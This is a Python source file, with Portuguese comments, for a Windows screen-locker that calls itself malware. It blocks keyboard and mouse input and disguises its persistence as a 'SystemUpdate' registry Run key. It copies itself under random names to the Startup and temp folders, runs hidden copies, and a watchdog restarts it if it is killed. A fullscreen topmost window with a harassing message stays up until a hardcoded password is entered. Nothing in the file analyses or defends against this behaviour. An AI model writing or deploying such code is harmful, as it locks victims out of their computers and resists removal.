import os
import sys
import ctypes
import threading
import time
import tkinter as tk
import winreg
import psutil
import shutil
import tempfile
import random
import string
import subprocess

# Configurações
PASSWORD = "218821ma"
LOCK_SCREEN_MSG = "PLASCOY\nVC voce foi molestado por plascoy"

class AdvancedWindowsDisabler:
    def __init__(self):
        # Configurar caminho do malware
        self.malware_path = os.path.abspath(sys.argv[0])
        
        # Gerar nome aleatório
        self.random_name = ''.join(random.choices(string.ascii_lowercase, k=8)) + ".exe"
        
        # Desativar teclas do sistema
        self.disable_system_keys()
        
        # Manter persistência
        self.setup_persistence()
        
        # Criar tela de bloqueio
        self.create_lock_screen()
    
    def disable_system_keys(self):
        """Desativa teclas do sistema"""
        # Usar ctypes para desativar teclas
        ctypes.windll.user32.BlockInput(True)
        
        # Desativar menu de contexto
        ctypes.windll.user32.SystemParametersInfoW(97, 0, "", 0)
    
    def setup_persistence(self):
        """Configura persistência no sistema"""
        try:
            # Adicionar ao registry
            key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, "SystemUpdate", 0, winreg.REG_SZ, self.malware_path)
            
            # Copiar para diretório de inicialização
            startup_folder = os.path.join(os.environ["APPDATA"], 
                                          "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            shutil.copy2(self.malware_path, os.path.join(startup_folder, self.random_name))
            
            # Criar arquivo temporário
            temp_path = os.path.join(tempfile.gettempdir(), self.random_name)
            shutil.copy2(self.malware_path, temp_path)
            
            # Executar arquivo temporário
            subprocess.Popen([temp_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        except Exception as e:
            pass
    
    def create_lock_screen(self):
        """Cria tela de bloqueio avançada"""
        # Ocultar janela
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        
        # Criar thread de verificação
        self.check_thread = threading.Thread(target=self.check_process)
        self.check_thread.daemon = True
        self.check_thread.start()
        
        # Criar tela de bloqueio
        self.root = tk.Tk()
        self.root.withdraw()
        
        # Criar tela de bloqueio principal
        self.window = tk.Toplevel(self.root)
        self.window.overrideredirect(True)
        
        # Definir tamanho da tela
        screen_width = ctypes.windll.user32.GetSystemMetrics(0)
        screen_height = ctypes.windll.user32.GetSystemMetrics(1)
        self.window.geometry(f"{screen_width}x{screen_height}+0+0")
        self.window.configure(bg="black")
        self.window.attributes('-topmost', True)
        
        # Texto vermelho
        tk.Label(
            self.window,
            text=LOCK_SCREEN_MSG,
            bg="black",
            fg="red",
            font=("Arial", 36, "bold"),
            justify=tk.CENTER
        ).pack(expand=True)
        
        # Campo de senha
        frame = tk.Frame(self.window, bg="black")
        frame.pack(pady=50)
        
        tk.Label(frame, text="SENHA:", bg="black", fg="red").pack()
        self.entry = tk.Entry(frame, show="*", width=20, bg="black", fg="red")
        self.entry.pack(pady=10)
        self.entry.focus()
        
        def check_password():
            if self.entry.get() == PASSWORD:
                self.window.destroy()
                self.root.destroy()
            else:
                self.window.bell()
        
        tk.Button(
            frame,
            text="DESBLOQUEAR",
            command=check_password,
            width=20,
            height=2,
            bg="black",
            fg="red",
            font=("Arial", 12, "bold")
        ).pack(pady=10)
        
        # Manter janela ativa
        self.window.mainloop()
    
    def check_process(self):
        """Verifica se processo está rodando"""
        while True:
            try:
                # Verificar se processo está ativo
                processes = [p for p in psutil.process_iter(['name']) 
                           if p.info['name'].lower() == os.path.basename(self.malware_path)]
                
                if not processes:
                    # Reiniciar processo
                    subprocess.Popen([self.malware_path], shell=True, 
                                   creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass
            time.sleep(60)

if __name__ == "__main__":
    AdvancedWindowsDisabler()
